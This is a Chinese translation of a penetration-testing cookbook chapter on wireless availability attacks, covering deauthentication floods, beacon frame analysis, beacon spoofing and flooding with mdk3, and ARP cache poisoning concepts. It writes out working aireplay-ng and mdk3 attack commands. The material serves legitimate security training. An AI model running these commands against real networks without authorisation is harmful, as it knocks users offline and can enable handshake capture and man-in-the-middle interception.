# Kali Linux 无线渗透测试秘籍（二）

> 原文：[`annas-archive.org/md5/D4F06D7644E988D14E142118F7AFB3EB`](https://annas-archive.org/md5/D4F06D7644E988D14E142118F7AFB3EB)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：攻击可用性

在本章中，我们将涵盖以下内容：

+   执行去认证洪水攻击

+   检测信标帧

+   欺骗信标帧

+   创建信标洪水攻击

+   ARP 缓存中毒

# 介绍

到目前为止，我们已经看到了 CIA 三要素中的两个。现在是时候看看 CIA 三要素的第三个和最后一个部分，即可用性。简单地说，可用性处理围绕着对资源（如文件、计算机甚至整个网络）丧失访问的问题，正如我们将在本章中看到的。可以想象，可用性的丧失是一个大问题，主要是因为如果您无法访问某物，无论那是什么，它对您来说基本上变得毫无价值，直到您再次获得访问权限。可以说，丧失对某物的访问权限也是相当令人沮丧的，因为这意味着您可能无法完成工作或任务，直到重新获得访问权限。

让我们在讨论可用性概念时再思考一下。想象一下在无线基础网络或环境中，客户端依赖于对文件、服务器甚至互联网的持续可靠访问，而无线访问丢失的情况。在这种情况下，如果这些客户端依赖于该访问来进行工作，您可能会有一个无法有效运行的业务或客户，这意味着业务本身可能无法运行，这绝对不是理想的情况。请记住，在某些情况下，即使部分丢失或受阻的可用性也足以严重影响业务。我们可以通过简单地想象自己可能遇到的情况来想象这种情况，比如在咖啡店、机场甚至酒店连接到无线网络。一个超出容量的拥挤网络，极其缓慢并且提供不可靠的资源访问，也会对业务的运营产生重大影响。事实上，在这种情况下，即使访问存在但速度非常慢，也会导致业务陷入停滞，这是不可接受的，需要避免。

在无线网络中，对抗可用性的影响是一个棘手的过程，但是非常可行。您会发现您有几种选项来对抗我们在本章中将看到的攻击类型，并使您的无线网络更具弹性和抵抗丧失可用性的影响。只是为了让您一窥究竟，这里有一些我们可以采用的对策，可以限制丧失可用性的影响，甚至可以消除这种可能性：

+   **调谐**：我所说的调谐是设置和配置您的无线接入点，以避免使用其他接入点可能正在使用的频道和频率。通过避免使用这些频道，您可以在很大程度上防止由于争夺频率和拥挤的频道而导致的减速、可用性丧失和减少范围。现在，请记住，您可能并不总是能够在特定区域独占使用频道和频率。您可以选择一个比其他区域的监狱拥挤得少的频道和频率，这样您就可以比在更拥挤的频道上有更多的空间。

+   **冗余**：使用这种技术简单地意味着我们实施了一种称为网状网络的东西，这是一种类似蜘蛛网的设置，设置在多个用于覆盖区域的接入点之间。通过使用这种设置，可以让多个接入点覆盖一个区域，以便如果其中任何一个接入点，甚至多个接入点，变得拥挤，我们可以安排提供一个强信号，其他节点或接入点可以接收并给客户一个更强大和更可靠的信号。虽然这种设置需要一些规划和努力才能使其发挥作用，但对于任何处理慢速或拥挤网络的人来说，它可以带来巨大的回报。值得注意的是，与之前几年可用的一些解决方案不同，现在可以以更具用户友好性甚至是消费者为基础的解决方案来廉价快速地设置网状网络，从家庭环境一直到大规模企业部署。

+   **企业认证**：虽然在保密性和完整性的前几章中提到了这个解决方案，但在可用性方面，它实际上有了不同的目的。使用其技术的企业认证系统，比如 radius 或直径，可以使无线网络的认证方面更难以被挤掉线，因此在面对基于拒绝服务的攻击时更具弹性。主要采用这种系统或机制意味着攻击者必须付出更多的努力才能通过认证系统将这个网络挤掉线，而不是如果他们有一个在自己身上做所有的专用接入点。这种解决方案的缺点是它需要更多的努力和更多的专业知识来设置和使其有效运行，但如果你想给自己一些额外的保护，这是值得考虑的。

+   **补丁和更新**：对于任何在 IT 领域工作了足够长时间的人来说，你可能不需要我来解释定期对固件软件进行补丁和更新的概念，但这是值得一提的。我们对客户和接入点的固件进行补丁和更新的原因是为了确保我们利用最新的功能和修复程序，其中一些可以使我们挫败拒绝服务和其他可用性攻击。

+   **配置**：这是一个涵盖了很多内容的大领域，可以帮助你极大地击败影响可用性的攻击。当我说这是一个大领域时，配置涵盖了从接入点的放置和设置、要使用的天线类型、要覆盖的设施或校园的部分，甚至一些小细节，比如在客户工作期间需要覆盖多少区域，以及他们在移动时需要访问无线网络的距离。

再次强调，这只是一个简短的清单，只是为了让你意识到一些可以用来阻碍可用性的事情。你应该始终保持对可用性问题和无线网络的最新了解，因为这往往是影响无线网络被客户群体认知和接受程度最大的领域之一。虽然保密性和完整性很重要，但客户更有可能注意到与可用性相关的问题，而不是其他两个方面。慢速网络和不可用的网络更加明显，因此不仅应该从用户满意度的角度来解决，还应该从安全的角度来解决。

# 攻击类型

正如所说，有很多方法可以影响无线网络的可用性。它们都有相同的基本目标，即防止无线网络被有效地连接和使用，或者根本无法连接。

在我们开始深入讨论每种攻击之前，我们应该首先定义本章将涵盖的攻击类型：

+   执行去关联洪水

+   检测信标帧

+   欺骗信标帧

+   执行信标洪水

+   执行去认证洪水

+   ARP 缓存中毒

+   执行拒绝服务

+   隐藏无线网络

这些攻击代表了一些影响无线网络可用性的更受欢迎的方式，因此我们在这里介绍它们。总之，还有其他故意和意外的可用性攻击可能困扰你的无线环境，你需要自行进行更多的研究。

# 执行去认证洪水

这种首次可用性攻击是一个有趣的攻击，而且非常有效。这种攻击被称为去关联洪水。在这种类型的攻击中，恶意方试图打破客户端与接入点的关联。当进行这种类型的攻击时，客户端将经历这样一种情况，他们被从无线接入点中踢出，并发现自己试图重新连接到接入点。关键词在于，他们是否能够连接到无线接入点。如果这种洪水以足够高的音量进行，并保持在那个水平，这意味着没有客户端能够长时间或根本无法连接到无线网络，这取决于条件如何发展。

只是为了明确，我们在这个章节讨论的攻击类型不是基于干扰的攻击。我们所说的干扰是指没有无线电信号或任何干扰被发送出去，用来阻止或阻碍无线网络所使用的频率。在执行基于干扰的攻击时，通常会使用一些东西，比如一个特定的重建设备，设计用来用无线电流量轰炸空气波，在这种情况下。虽然这种攻击会起作用，因为干扰会扰乱无线频率，但它的工作方式也是不加区别的。基本上，你不能选择哪些客户端会保持连接，哪些不会，也不能选择你想要阻塞的无线网络。在这些频率范围内的任何东西都将被阻塞。这种类型的攻击也存在非常真实的问题，即非法行为，并可能面临严厉的罚款甚至监禁。我们在本书中不会使用干扰。

提出这一点的唯一原因是，有时候去认证洪水被错误地称为干扰攻击。我们所讨论的攻击类型非常有选择性，意味着它可以使无线网络或个别客户端中断。它也不会用不加区别的无线电流量轰炸空气波，而是使用特制的帧来瞄准它的受害者或受害者。

关于这种类型的攻击，一个问题是为什么无线网络中实际上存在去认证帧？嗯，对此实际上有一个很好的答案，最明显的是它可以用来断开行为不端或因某种原因需要断开连接的无线客户端。这种帧类型存在的其他原因也有。例如，使用去认证帧将客户端踢出可能用于发现连接到您的无线网络的恶意客户端的情况。一旦发现它们，可以有选择性地针对性地断开连接。这种认证帧的另一个更恶意的用途不仅可以造成服务拒绝，还可以迫使客户端连接到我们控制的伪装接入点。在这种情况下，我们会在合法接入点的附近设置我们自己的无线接入点。然后，我们会发送去认证帧将人们从合法网络中踢出，并可能迫使或诱使他们连接到我们控制的接入点。这个接入点恰好是可用的，准备好并开放与他们一起工作。以下图表显示了连接到无线网络的正常认证过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/41591879-7582-4f74-a622-ea94998fa2a2.png)

无线网络的正常认证过程和去认证

如果我不提及另一种半合法（我轻描淡写地使用这个词）使用去认证帧的情况，那就真的是我的疏忽了。一个半合法使用去认证帧的例子发生在美国，一家酒店连锁被发现强迫人们使用酒店的 Wi-Fi 而不是其他提供商的 Wi-Fi。在这种情况下，酒店使用设备发送去认证帧，阻止酒店客人使用外部 Wi-Fi，而是支付酒店自己的 Wi-Fi 服务。一旦发现酒店使用这种类型的设备，很快就会遭到客人和客户的法律挑战。最终发现，在美国任何一家使用这种技术强制使用他们服务的酒店都是非法的，任何使用这种技术的企业都将受到联邦通信委员会的重罚和法律诉讼。

值得一提的是，关于在需要保障设施和数据传输安全的地方是否可以使用去认证洪水的讨论仍在进行中。目前，答案似乎是没有直接的答案，因为去认证洪水已被用于创建只有授权网络对某一商业区域的人员可用的安全空间。

以下图表显示了去认证洪水的概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/8953570e-9467-48c1-8dac-f65f3e801d00.png)

去认证洪水

取消认证帧还有另一个用途，对于针对无线网络或网络进行渗透测试的人来说非常方便，那就是用它来获取网络的密码或密钥。在这种情况下，攻击者将发送 AE 取消认证洪水，并从目标网络中的客户端中踢出一个客户端。当该客户端尝试重新连接时，攻击者将嗅探在该连接期间生成的流量，并尝试提取连接信息交换。这种类型的攻击也可以用于诱导中间人情况，攻击者将取消认证受害者，然后强制他们通过一个恶意接入点重新认证。然后，他们将把流量引导到互联网连接或实际合法网络。实质上，首先我们会发出取消认证帧或洪水，然后我们会使用我们在前一章中探讨过的中间人或恶意接入点设置，然后我们将能够捕获这些凭据作为握手。

# 准备工作

要开始，您需要准备以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

# 如何做...

要执行关联洪水，我们只需要使用我们在早期章节中看到的步骤的组合，并额外添加一些内容以调整它以适应我们的目的。

在这种情况下，我们有一个客户端连接到无线接入点或无线路由器，正在进行他们的业务。攻击者将尝试中断他们与网络的连接：

1.  为了开始，我们需要首先将我们的网络卡置于监视模式。再次强调，这与我们在以前的教程中所做的没有什么不同。为了简化事情，我们将假设我们的无线适配器使用名称`wlan0`，但请双重检查以确保在您的系统上名称相同：

```
    airmon-ng start wlan0
```

与以前一样，`airmon-ng`实用程序已将我们的无线卡切换到监视模式，并应该将其重命名为类似`mon0`的名称。完成后，我们将能够查看我们需要的所有流量。以下屏幕截图显示了`airmon-ng`命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/a7187794-7544-4ddd-b956-778c3d4545e0.png)

airmon-ng 将 wlan0 切换到监视模式。

1.  接下来，我们需要使用`airodump-ng`工具从监视接口中捕获信息，如下所示：

```
 airodump-ng mon0 
```

此时，攻击者将可以访问有关目标系统范围内无线接入点的信息（ESSID、信道、BSSID 等）：

1.  有了手头的网络列表，我们现在可以选择一个，并将该网络的十六进制值放入`airodump-ng`命令中，以便专注于特定网络。这个命令的结果是，我们将能够检索到当前活跃连接到接入点的客户端列表。要找到这些信息，我们将使用以下命令：

```
 airodump-ng mon0 -c 1 -bssid 00:05:59:49:A7:A0 
```

其中`airodump-ng`是工具，`mon0`是接口，`-c`是信道，`-bssid`是接入点的 MAC 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/63539b1d-eb2e-4fef-9cdd-3c6dc598363a.png)

仔细检查后，结果将显示当前连接到接入点的客户端。为了简化操作，您只需浏览客户端列表，选择要踢掉的客户端，并注意其 MAC 地址，例如`00:13:CE:AC:70:BE`。

1.  最后一步是实际上取消认证或与接入点断开客户端的关联。我们这样做：

```
 aireplay-ng -0 1000 -a  00:05:59:49:A7:A0 -c 
    00:13:CE:AC:70:BE mon0 
```

其中`aireplay-ng`是工具，`-0`是取消认证攻击的参数，`1000`是要传输的取消认证的数量，`-a`是无线路由器的 MAC 地址，`-c`是客户端的 MAC 地址，`mon0`是接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/21b3769e-8f34-4da3-bb17-d6fd75755311.png)

前面的截图显示了攻击成功执行。客户端从网络中断开，并且在攻击者停止发送去认证消息之前无法建立连接。

# 检测信标帧

先前，我们讨论了信标帧及其对无线网络的重要性，以及它们在无线网络中的使用方式。现在，让我们更仔细地研究一下它们，看看信标帧中包含了什么，以及如何分析它，以便在本章节后续的攻击中使用这些信息。

那么，什么是信标帧？信标帧是由无线接入点发送的，用于识别无线网络的名称，关于该无线网络的一些参数，以及一些其他用于维护和其他任务的信息。每个无线网络都会定期发送信标帧，用于向处于该接入点范围内的无线客户端和设备宣布该网络的存在。

让我们分解一下由无线局域网发送的信标帧中的一些部分或组件：

+   **时间戳**：时间戳作为信标帧的一部分包含在其中，目的是为了通知该网络上的所有无线客户端和设备同步或将其时钟设置为该时间。这允许网络比如果时钟运行在不同的间隔并且不相互同步时更有效地运行。这个时间戳随着信标一起发送，客户端会查看时间戳并将其时钟设置为这个时间，以便参与无线局域网的每个人都能同步。

+   **信标间隔**：可以想象，像信标间隔这样的名称，这一定会告诉我们信标帧发送的频率。这个数值将告诉无线局域网上的节点信标帧必须发送的频率。在一些无线网络中，这是用户或系统管理员可配置的设置。然而，在大多数消费者级别的接入点和设备上，这是不可访问的，并且在制造接入点时由制造商定义。

+   **能力信息**：这实际上是信标帧的一个重要组成部分，因为它描述了网络的格式，无论是运行基础设施还是自组网模式，无论是使用某些安全功能，甚至是支持的加密类型。可以想象，获取这些信息并能够解析它可以告诉你关于网络运行方式以及你需要了解的内容。

需要记住的一点是，虽然可以在无线网络上调整信标帧的间隔，但在每种情况下都改变间隔可能并不理想。虽然有好处，但也可能存在一些需要谨慎的缺点。例如，加快信标帧的传输可以更频繁地发送这些信标帧，但也会导致网络上的额外流量，这意味着从网络用户那里取走带宽，或者更具体地说，降低了网络的吞吐量，这意味着你实际上使网络变慢了。

加快信标帧的好处是客户端可以更快地关联到网络，如果它们漫游，它们将能够更快地跟踪网络和服务的变化。另一方面，拉长信标帧之间的时间将减少网络的开销。这样做的直接影响是关联速度变慢，漫游的客户端关联过程更慢，并且无法快速获取关于网络变化的信息。如果你是无线网络工程师，通常最好不要改变信标间隔，因为它可能会产生负面影响，正如它可能产生积极影响一样。

实际上，信标帧确实会增加无线网络上生成的流量。但是通常很少，重要的是要发送这个信标以使网络正常运行。当无线客户端在支持的频道上扫描和寻找无线网络时，它正在寻找信标帧，告诉它有一个接入点区域以及有关该接入点的一些详细信息。这些信息还允许客户端不仅确定区域内的无线网络和功能，还允许它们根据提供的功能和服务对它们进行优先排序，并因此允许用户或客户端本身确定哪个是要连接的最佳网络。以下屏幕截图显示了在 Wireshark 中捕获的信标帧：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/aae8405a-6c08-44f6-b69e-809b09de91bb.jpg)

在 Wireshark 中显示信标帧

请记住，即使客户端已经与无线网络关联，扫描过程仍在继续，客户端仍在寻找跨其他频道识别其他无线网络的信标。这样做的想法是通过不断扫描和寻找其他无线网络，使用户能够在当前网络不足或不可用时切换到另一个网络。信标帧还有利于同步时钟，这不仅会发生一次，而且会定期发生，以确保时钟始终保持与彼此接近的同步，并且它们不会慢慢地脱离同步，因此它具有重要作用。信标帧还作为一个方便的机制，通知连接到网络的客户端网络中的变化，例如速度或频道，将会发生，并且他们需要为此做好准备并预期这种变化。

话虽如此，让我们继续捕获和分析信标帧，以便我们连接以直接了解其中包含的内容以及对我们的意义。这些信息本身并不是一种攻击，但它可以作为我们将在本章中看到的攻击的前兆，因此，我们将使用这个配方来使您熟悉这一点。

# 准备工作

要开始，您需要准备以下项目：

+   能够进入监视模式的无线网卡

+   安装了 Wireshark 的 Kali Linux

# 如何做...

Kismet 是一个有效的工具，用于定位和提取无线接入点和设备中的有用信息，在这种情况下，它将被用于检测传输的信标帧。

在这个配方中，我们将从命令提示符开始 Kismet。但是它也可以从应用程序菜单的无线攻击部分启动。在任何一种情况下，启动 Kismet 都将导致这里记录的步骤：

1.  打开一个终端窗口。

1.  在命令提示符下，输入`kismet`命令。

1.  现在，您将从半图形环境中配置 Kismet。您将使用*Tab*和*Enter*键进行导航。

1.  如果看不到灰色字母行，请使用*Tab*键突出显示`No`。否则，保持`Yes`突出显示。

1.  按一次*Enter*键。

1.  按一次*Enter*键以确认 Kismet 正在以 root 身份运行。

1.  按一次*Enter*键自动启动 Kismet 服务器。

1.  按一次*Enter*键以确认您要启动 Kismet 服务器。

1.  按一次*Enter*键以验证您可以添加捕获源。

1.  使用`ifconfig`输入您的无线接口的名称。如果您不记得，可以打开另一个控制台窗口，并再次运行`ifconfig`命令以确定正确的接口（通常会以`wlan`开头命名）。以下屏幕截图显示了接口输入屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/b008c405-9dc6-4542-98e1-1f2affdfe152.png)

Kismet 界面配置

1.  按一次*Tab*键。

1.  在“名称”字段中键入无线接口的名称。

1.  再次按下*Tab*键。

1.  再次按下*Tab*键。

1.  按下*Enter*键一次。

1.  如果您输入了正确的名称，Kismet 应该能够识别命名的无线接口。它还会生成不需要的虚拟接口的名称，如`wlan0mon`、`wlan0monmon`和`wmaster0`。

1.  当在 shell（Kismet 窗口）的右下角显示“关闭控制台窗口”时，按一次*Tab*键以突出显示“关闭控制台窗口”。

1.  按下*Enter*键一次。

1.  无线接入点列表将显示在 Shell（Kismet 窗口）的左上象限。

1.  点击下拉菜单上的“查看”。

1.  点击“监视活动”。

一旦到达这一点，您将看到接入点名称（以及客户端）开始快速填充界面。与此工具之前看到的一样，与列表上出现的每个网络名称或 SSID 相关的详细信息和信息。这些条目是从开始填充窗口的信标帧中提取的信息填充的。您将看到每个设备的名称、信道、无线标准和其他相关信息。如果等待足够长的时间，您会注意到其他设备会出现，列表中的其他项目可能会有更多的信息填充，这些信息以前可能不存在。

在查看 Kismet 窗口中显示的网络列表时，可能会看到一些看起来有些不同的条目。例如，看一下以下的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/43946ede-ad9a-418e-a2d2-48f4f297d7e3.png)

显示主 Kismet 窗口显示检测到的无线客户端。

如果您查看窗口中的项目，您会注意到列表中有一个“探测网络”的条目，如果您移动到列表中的这个项目并使用*+*或*- *键来打开或关闭选择。展开项目后，将显示一个项目列表。这个列表记录了来自附近系统的探测请求。这些问题是由一个无线启用的系统发送的，它试图连接到它过去连接过的网络。仔细分析出现在探测请求下的网络名称可以揭示系统连接到不同接入点的名称，并让您了解系统可能是如何或在哪里使用的。请记住，只要设备未与无线网络关联，许多操作系统就会发送这些探测请求。

还有其他软件包可以用来做 Kismet 正在做的同样的事情，但是 Kismet 具有高度可定制和被动的优势。被动意味着软件不会发送任何东西来引发附近无线接入点的响应。相反，软件监听与接入点相关的连接和流量，以揭示其存在并确定其名称。此外，该软件包还具有检测隐藏接入点的能力，而其他类似的软件包可能无法做到这一点。

# 伪造信标帧

在这个教程中，我们将看一下伪造信标帧。现在我们已经看到了信标帧的实际样子，以及一些信标帧的属性，我们可以理解伪造信标帧的价值以及如何利用它来影响无线网络或特定接入点的可用性。

在检查信标帧的内容之后，我们可以看到重要的信息，如时间的下沉、网络的识别以及其他属性都包含在这个重要的帧中。如果攻击者想要干扰无线网络的运行，比如减慢网络速度或使网络不可用，信标帧是一个理想的地方来采取这个行动。

重要的是要事先知道欺骗信标帧攻击的可能性。破坏无线网络的一种可接受形式是缺乏对伪造帧的验证或验证。虽然在过去几年中市场上出现了旨在帮助检测伪造到无线网络的帧的产品和技术，但这远非是一种可以用来保护无线网络的常见情况。对于那些确实对伪造帧进行了某种检测的无线网络，存在另一个问题，由于无线网络的不稳定性和不同供应商提供的多种通信形式，要检测伪造帧变得更加棘手。此外，系统和网络管理员有一些技术可以结合使用，以覆盖整个频谱，并允许检测伪造帧，从而防止这类攻击。

在审查可以用于针对目标网络的信标帧时，有一件非常重要的事情需要考虑，那就是这不是一种容易执行的攻击。虽然我们让它听起来很容易，但在实践中，需要一些耐心和努力才能使其正确运行。虽然恶意方可能会在网上寻找有关如何执行这种攻击的具体信息，甚至阅读这里的步骤，但这仍然需要一些试验、错误和耐心。

需要记住的另一件事是，这种类型的攻击肯定可以被检测到，因为技术和技巧已经发展到足够先进的程度，可以有效地检测伪造的信标帧。网络所有者面临的挑战是要理解这是一种潜在的攻击。他们需要明白这是他们应该部署或采用保护措施，以降低这种类型攻击发生的风险。

在我们逐步介绍如何成功执行这种攻击之前，让我们简要地看一下欺骗信标帧的过程。我将描述各个组成部分，并给出这种类型攻击的解剖，然后我们将继续并在真实环境中实施这种攻击。

在最基本的层面上，实际上执行欺骗信标帧攻击有两个阶段，其中一个阶段依赖于我们已经知道的工具，即`airmon-ng`。这个工具用于将无线适配器置于监视模式，以便能够观察区域内所有无线网络的流量，即使它没有与任何网络关联。使用这个工具来欺骗信标帧与以往使用它的方式并无不同。我们只需告诉工具在特定接口上进入监视模式，然后这个阶段就完成了。

欺骗信标帧的第二阶段是魔术发生的地方，使整个过程成为现实。为了执行第二阶段，我们将使用一个名为`mdk3`的工具，这是本诊所发行版中包含的另一个命令行实用程序。这个工具将允许我们生成具有我们选择的任何名称和属性的信标帧，并在开放环境中进行传输。最终结果是，这个工具可以发送大量的信标帧，可以从文本文件中读取，您可以预先填充自己的名称。这将在区域内生成大量虚假接入点，会使客户端变慢和困惑，并且在某些情况下，甚至会中断它们与当前网络的关联，如果名称恰好相同的话。我们在这里所做的是通过使用这个单一工具创建一种拒绝服务。

# 准备工作

要开始进行操作，您需要准备以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果你愿意，你可以轻松地使用更多（或不同的）组件。例如，如果你想要增强范围，你可以使用一个带有外部天线连接的基于 USB 的无线网卡，这样可以获得更好的接收效果。

在这个练习中，需要记住的一点是，我们将使用一系列工具，这些工具都来自一个套件，旨在破解和分析无线网络的流量。虽然套件中可能包含了大约十几个工具，但在本章中我们只使用了三到四个。然而，在后续章节中，我们将重新访问套件中的不同工具，并在途中使用它们。这将是你对 air crack 套件中一些成员的首次探索。

# 如何做...

第一步是将无线适配器置于监视模式。在这种情况下，我们假设我们的无线适配器使用名称`wlan0`（就像以前一样），但请仔细检查确保在您的系统上名称相同：

```
    airmon-ng start wlan0

```

就像以前一样，`airmon-ng`实用程序已经将我们的无线网卡切换到监视模式，并应该将其重命名为类似`mon0`的名称。一旦完成这一步，我们就能够查看所有我们需要的流量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/19864580-bf33-43bf-aadb-bd794f716afa.png)

airmon-ng 将 wlan0 切换到监视模式。

接下来，我们需要使用`airodump-ng`工具来从监视接口捕获信息，就像这样：

```
airodump-ng mon0 
```

此时，攻击者将可以访问有关目标系统范围内的无线接入点的信息（ESSID、信道、BSSID 等）。

一旦我们从列表中选择了一个要欺骗的网络，我们可以继续下一步，即使用一个名为`mdk3`的工具。`mdk3`是一个实用程序，用于利用 802.11 标准中存在的漏洞和其他问题，其中之一是伪造信标帧的能力。

要使用`mdk3`工具，我们可以从列表中选择一个接入点，或者使用我们自己制作的名称。一旦我们有一个想法，我们就可以使用以下语法运行`mdk3`命令（我们将伪造一个名为`impa`的网络）：

```
mdk3 mon0 b -n "impa" -b 54 -w a -m -c 11 
```

`b`激活信标洪水模式，`-n`设置名称，`-b 54`使其为`54` MB，`-w a`仅启用 WPA2/AES，`-m`使`mdk3`仅使用有效地址，因此攻击者将很难进行过滤，`-c`设置正确的信道。

此时，如果你使用另一个无线设备来检查该区域的无线网络，你会看到一个新的网络正在广播，这种情况下被命名为 IMPA。

# 创建信标洪水

在这个配方中，我们将继续从上一个配方中的思路和探索开始，那里我们伪造了一个信标帧，但我们将通过尝试洪水式地发送信标帧来提高强度。在上一个配方中，我们主要关注如何创建伪造的信标帧。在这里，我们想要做的是连续发送假的接入点，以混淆该区域的客户端，并导致它们出现性能问题。事实上，进行信标洪水的迷人之处在于，在某些条件下，它可以导致扫描仪、软件甚至驱动程序不仅表现不佳，甚至会崩溃或甚至锁定它们所在的系统。你可以想象这是一种拒绝服务，对于那些软件设备的所有者或者出现问题的节点来说，这将是非常令人沮丧的。以下图表显示了信标洪水的概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/f33b5e59-46be-412d-8215-d399323b77cd.png)

信标洪水的概念

通过信标洪水，我们可以生成大量的虚假接入点，以及改变这些虚假接入点的参数和信道，进一步完善和增强攻击，造成更大的破坏。你会发现这次攻击的初始步骤与上一个攻击的步骤完全相同。变化发生的地方是当我们开始使用`mdk`实用程序来开始改变那些参数，以达到造成影响的目的。

# 做好准备

为了开始，你需要准备以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果你愿意，你可以轻松地使用更多（或不同）的组件。例如，如果你想要增强范围，你可以使用一个基于 USB 的无线网卡，它具有外部天线的连接，可以获得更好的接收。

在这个练习中需要记住的一件重要的事情是，我们将使用一系列工具，这些工具都来自一个套件，旨在破解和分析无线网络的流量，可能有大约十几个工具包含在套件中，而我们在这一特定章节中只使用了三到四个。然而，在随后的章节中，我们将实际上重新访问套件中的不同工具，并在途中为不同的目的使用它们。因此，这将是你对 air crack 套件中一些成员的首次探索。

第一步是将无线适配器置于混杂模式或监视模式。这与我们在第四章中所做的没有什么不同，*攻击机密*。在这种情况下，我们将假设我们的无线适配器使用名称`wlan0`，但请仔细检查以确保在您的系统上名称相同：

```
airmon-ng start wlan0 
```

就像以前一样，`airmon-ng`实用程序已经将我们的无线网卡切换到监视模式，并且应该已经将其重命名为类似`mon0`的东西。一旦这样做了，我们就能够查看所有我们需要的流量。以下屏幕截图显示了`airmon-ng`命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/e7bb32ee-beaf-4d28-a57a-92a72272083b.png)

airmon-ng 将 wlan0 切换到监视模式。

下一步是再次激活`airodump-ng`实用程序，以查看附近的无线网络或接入点列表。记住，我们需要有一个目标网络来攻击，否则这将不会产生预期的效果。我们将创建的信标将使用我们提供的给定网络的 SSID 来生成：

```
airodump-ng mon0 
```

如果命令执行正确，我们应该看到附近的无线网络列表。在这一点上，你会选择你想要攻击的那个。你特别想要的是你想要攻击的站点的 ESSID 标签的信息；其他任何东西（比如 BSSID）都需要修改命令。

一旦你选择了目标，你需要使用以下命令：

```
mdk3 mon0 b -t <BSSID target> -c <channel> 
```

如果你想改变洪水的时间，你可以添加`-s`命令行，所以：

```
mdk3 mon0 b -t station/bssid -s 360 
```

在这种情况下，`360`是每秒将被传输的数据包数量。

如果你想查看信标的流动，你可以在另一台 Kali 工作站上运行 Kismet，你会看到一大堆信标被接收，代表我们原始攻击系统的努力。

# ARP 缓存投毒

在这个配方中，我们不会直接攻击无线网络，而是操纵网络中存在的东西来执行操作，比如嗅探或中间人攻击。我们在这里探讨的技术被称为 ARP 缓存投毒，可以用于使用 TCP/IP 协议的任何网络。

那么 ARP 是什么？嗯 ARP，或地址解析协议，是 TCP/IP 协议的一个组成部分，用于将逻辑地址或 IP 地址链接到物理地址或 MAC 地址。在实践中，以下是 ARP 的工作原理。

让我们想象一种情况，你有两个位于同一子网上的客户端，它们希望彼此发起通信。在这种情况下，IP 地址在正常意义上并不需要，因为没有路由要求。在这种情况下，如果一个客户端希望向另一个客户端发送流量，它将首先检查其 ARP 缓存，看看它是否先前与预期目标进行过通信。如果 ARP 缓存或表中存在 IP 到 MAC 地址映射，则发送站将直接使用该信息将数据发送到接收方。然而，如果 ARP 缓存中没有传输所需的信息，它将在该子网上发送 ARP 广播。当发送方正在寻找的客户端接收到这个广播时，接收方将向发送方发送其 IP 地址和 MAC 地址的组合。在那时，发送方将使用这些信息来正确地寻址和传输数据，从而确保它到达预期的目的地，IP 和 MAC 地址的组合也将保留在本地 ARP 缓存中，以便未来的传输可以更快地进行。以下屏幕截图显示了 ARP 缓存的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/b20bf51a-2829-4de5-aa2f-750bbe5da2bb.jpg)

在 Linux 中的 ARP 缓存

在进行 ARP 缓存欺骗时要记住的一件事是，你可以主动地对其进行欺骗，并使用我们正在讨论的技术将信息放入目标的缓存中。然而，如果被定位的用户或受害者重新启动系统，那么您放入其缓存中的信息将被清除，您将不得不重新发起欺骗。

让我们剖析一次 ARP 欺骗攻击，以便我们了解我们试图做的是什么，以引起混乱。正如我们发现的那样，ARP 有一种非常特定的工作方式，允许上升方找到其预期接收方的 IP 地址和 MAC 地址组合，该过程在设计上相当简单。在进行缓存欺骗攻击时，我们希望向受害者发送伪造或欺骗的 ARP 回复，目的是让他们缓存我们的回复，然后在以后的操作中使用它们来发送信息。现在，仔细看看我刚才说的我们试图做的事情。我说我们试图发送 ARP 回复，但我从来没有说过要出去引诱那个回复。换句话说，这就好像我走到你面前说再见，然后走开。如果我在现实生活中这样做，你会认为我有点疯狂，因为没有什么可以和我说再见。然而，由于 ARP 的工作方式，这种情况实际上在数字世界中是有效的。

所以这里的问题是，我在尝试用什么回复来毒害你的缓存？嗯，答案很简单：里面有什么？发送 ARP 广播是因为系统在本地子网上有一个客户端的 IP 地址。由于它不需要 IP 地址和本地子网，它想要使用 MAC 地址。因此，通过发送这个请求来说，“我有这个 IP 地址，现在谁拥有这个 IP 地址”，在你的网络卡上有一个 MAC 地址，我会得到一个 IP 和 MAC 的组合。攻击者会修改这个回复，以便在你寻找特定 IP 地址时，转而去寻找另一个 MAC 地址，这恰好是恶意方控制的系统上的网络卡的 MAC 地址。通过主动向受害者发送这个组合，ARP 过程被颠覆，因为传输系统将寻找是否有关于它正在尝试传输数据的站点的信息，因为这些信息将被主动缓存，不会进行广播以找到具有合法 IP 地址和 MAC 地址组合的真正所有者。结果是流量将被定向到与接收者认为正确的客户端不同的地方。

以下图片显示了 ARP 攻击的过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/cfbc3a94-7da1-4536-a3f5-e3c21ce2aa85.png)

ARP 缓存中毒攻击

